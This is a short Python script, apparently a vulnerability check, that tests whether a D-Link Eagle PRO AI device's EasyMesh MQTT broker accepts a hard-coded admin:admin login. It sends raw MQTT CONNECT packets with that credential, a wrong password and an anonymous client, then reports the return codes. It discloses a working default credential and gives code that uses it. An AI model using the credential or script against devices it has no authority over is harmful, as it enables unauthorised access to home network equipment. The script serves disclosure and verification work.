#!/usr/bin/env python3
"""
Check a D-Link Eagle PRO AI device for the hard-coded EasyMesh MQTT broker credential.

The broker configuration written by commander is:

    allow_anonymous false
    password_file /etc/emDaemon/passwd   ->   admin:admin

This script sends raw MQTT 3.1.1 CONNECT packets for `admin/admin`, for a wrong password and for
an anonymous client, and prints the CONNACK return code of each.

Usage:  python3 mqtt-fixed-cred-check.py <host> [port]
"""
import socket
import struct
import sys


def connect_packet(client_id=b"x", username=None, password=None):
    vh = b"\x00\x04MQTT" + bytes([4])  # protocol name "MQTT", protocol level 4
    flags = 0x02  # clean session
    payload = struct.pack(">H", len(client_id)) + client_id
    if username is not None:
        flags |= 0x80
        payload += struct.pack(">H", len(username)) + username
    if password is not None:
        flags |= 0x40
        payload += struct.pack(">H", len(password)) + password
    vh += bytes([flags]) + struct.pack(">H", 60)  # keepalive 60 s
    body = vh + payload
    return b"\x10" + bytes([len(body)]) + body


def try_connect(host, port, username=None, password=None):
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(connect_packet(username=username, password=password))
        data = s.recv(4)
        s.close()
    except Exception as exc:  # noqa: BLE001
        return "error: %s" % exc
    if len(data) >= 4 and data[0] == 0x20 and data[1] == 0x02:
        rc = data[3]
        return "CONNACK return code %d (%s)" % (
            rc,
            {0: "accepted", 1: "unacceptable protocol version", 2: "identifier rejected",
             3: "server unavailable", 4: "bad username or password", 5: "not authorised"}.get(rc, "?"),
        )
    return "unexpected reply: %s" % data.hex(" ")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    print("target %s:%d" % (host, port))
    print("  admin/admin :", try_connect(host, port, b"admin", b"admin"))
    print("  admin/wrong :", try_connect(host, port, b"admin", b"wrong"))
    print("  anonymous   :", try_connect(host, port))
    return 0


if __name__ == "__main__":
    sys.exit(main())
